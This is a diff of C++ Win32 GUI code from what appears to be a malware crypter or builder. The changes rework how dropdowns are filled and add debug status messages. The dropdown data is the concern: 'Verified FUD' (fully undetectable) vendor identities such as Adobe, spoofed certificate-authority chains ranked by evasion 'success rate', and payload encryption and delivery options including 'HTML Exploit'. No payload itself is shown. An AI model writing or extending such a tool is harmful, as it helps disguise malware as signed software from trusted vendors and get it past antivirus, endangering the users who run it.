@@ -386,31 +386,35 @@ private:
 
 public:
     CertificateEngine() {
-        // Verified FUD Companies
-        companies = {
-            "Adobe Systems Incorporated"
-        };
+        // Verified FUD Companies (ANSI strings)
+        companies.clear();
+        companies.push_back("Adobe Systems Incorporated");
 
         // Verified FUD Certificate Chains (Based on Testing Results)
-        verifiedCertificates["Adobe Systems Incorporated"] = {
-            "Thawte Timestamping CA",           // 90.6% success rate - CHAMPION
-            "GoDaddy Root Certificate Authority", // 100% success rate
-            "HP Enterprise Root CA",            // 85.7% success rate
-            "Apple Root CA",                    // 67.5% success rate
-            "Comodo RSA CA",                    // 66.7% success rate
-            "Entrust Root CA",                  // 100% success rate
-            "GeoTrust Global CA",               // 100% success rate
-            "DigiCert Assured ID Root CA",      // 100% success rate
-            "GlobalSign Root CA",               // 100% success rate
-            "Lenovo Certificate Authority",     // 100% success rate
-            "Baltimore CyberTrust Root",        // Mixed results
-            "Broadcom Root CA",                 // 100% success rate
-            "Samsung Knox Root CA",             // 100% success rate
-            "Qualcomm Root Authority",          // 50% success rate
-            "Realtek Root Certificate"          // 60% success rate
-        };
+        verifiedCertificates.clear();
+        std::vector<std::string> adobeCerts;
+        adobeCerts.push_back("Thawte Timestamping CA");           // 90.6% success rate - CHAMPION
+        adobeCerts.push_back("GoDaddy Root Certificate Authority"); // 100% success rate
+        adobeCerts.push_back("HP Enterprise Root CA");            // 85.7% success rate
+        adobeCerts.push_back("Apple Root CA");                    // 67.5% success rate
+        adobeCerts.push_back("Comodo RSA CA");                    // 66.7% success rate
+        adobeCerts.push_back("Entrust Root CA");                  // 100% success rate
+        adobeCerts.push_back("GeoTrust Global CA");               // 100% success rate
+        adobeCerts.push_back("DigiCert Assured ID Root CA");      // 100% success rate
+        adobeCerts.push_back("GlobalSign Root CA");               // 100% success rate
+        adobeCerts.push_back("Lenovo Certificate Authority");     // 100% success rate
+        adobeCerts.push_back("Baltimore CyberTrust Root");        // Mixed results
+        adobeCerts.push_back("Broadcom Root CA");                 // 100% success rate
+        adobeCerts.push_back("Samsung Knox Root CA");             // 100% success rate
+        adobeCerts.push_back("Qualcomm Root Authority");          // 50% success rate
+        adobeCerts.push_back("Realtek Root Certificate");         // 60% success rate
+        verifiedCertificates["Adobe Systems Incorporated"] = adobeCerts;
 
-        architectures["Adobe Systems Incorporated"] = { "x64", "AnyCPU" };
+        architectures.clear();
+        std::vector<std::string> adobeArchs;
+        adobeArchs.push_back("x64");
+        adobeArchs.push_back("AnyCPU");
+        architectures["Adobe Systems Incorporated"] = adobeArchs;
     }
 
     std::vector<std::string> getCompanies() const {
@@ -1032,7 +1036,12 @@ void populateCompanyCombo() {
     
     SendMessage(hCompanyCombo, CB_RESETCONTENT, 0, 0);
     for (const auto& company : companies) {
-        SendMessage(hCompanyCombo, CB_ADDSTRING, 0, (LPARAM)company.c_str());
+        int result = SendMessage(hCompanyCombo, CB_ADDSTRING, 0, (LPARAM)company.c_str());
+        // Debug: Show in status text
+        if (hStatusText) {
+            std::string status = "Added company: " + company;
+            SetWindowTextA(hStatusText, status.c_str());
+        }
     }
     
     if (!companies.empty()) {
@@ -1043,8 +1052,11 @@ void populateCompanyCombo() {
 }
 
 void populateCertificateCombo() {
-    char companyText[256];
-    GetWindowTextA(hCompanyCombo, companyText, sizeof(companyText));
+    char companyText[256] = {0};
+    int companyIdx = SendMessage(hCompanyCombo, CB_GETCURSEL, 0, 0);
+    if (companyIdx != CB_ERR) {
+        SendMessage(hCompanyCombo, CB_GETLBTEXT, companyIdx, (LPARAM)companyText);
+    }
     
     CertificateEngine certEngine;
     auto certificates = certEngine.getCertificates(companyText);
@@ -1056,6 +1068,11 @@ void populateCertificateCombo() {
     
     if (!certificates.empty()) {
         SendMessage(hCertCombo, CB_SETCURSEL, 0, 0);
+        // Debug: Show certificate count
+        if (hStatusText) {
+            std::string status = "Loaded " + std::to_string(certificates.size()) + " certificates for " + companyText;
+            SetWindowTextA(hStatusText, status.c_str());
+        }
     }
 }
 
@@ -1077,6 +1094,7 @@ void populateArchitectureCombo() {
 }
 
 void populateEncryptionCombo() {
+    SendMessage(hEncryptionCombo, CB_RESETCONTENT, 0, 0);
     SendMessage(hEncryptionCombo, CB_ADDSTRING, 0, (LPARAM)"XOR Encryption");
     SendMessage(hEncryptionCombo, CB_ADDSTRING, 0, (LPARAM)"ChaCha20 Encryption");
     SendMessage(hEncryptionCombo, CB_ADDSTRING, 0, (LPARAM)"AES-256 Encryption");
@@ -1084,6 +1102,7 @@ void populateEncryptionCombo() {
 }
 
 void populateDeliveryCombo() {
+    SendMessage(hDeliveryCombo, CB_RESETCONTENT, 0, 0);
     SendMessage(hDeliveryCombo, CB_ADDSTRING, 0, (LPARAM)"No Exploit (Benign Stub)");
     SendMessage(hDeliveryCombo, CB_ADDSTRING, 0, (LPARAM)"PE Executable");
     SendMessage(hDeliveryCombo, CB_ADDSTRING, 0, (LPARAM)"HTML Exploit");
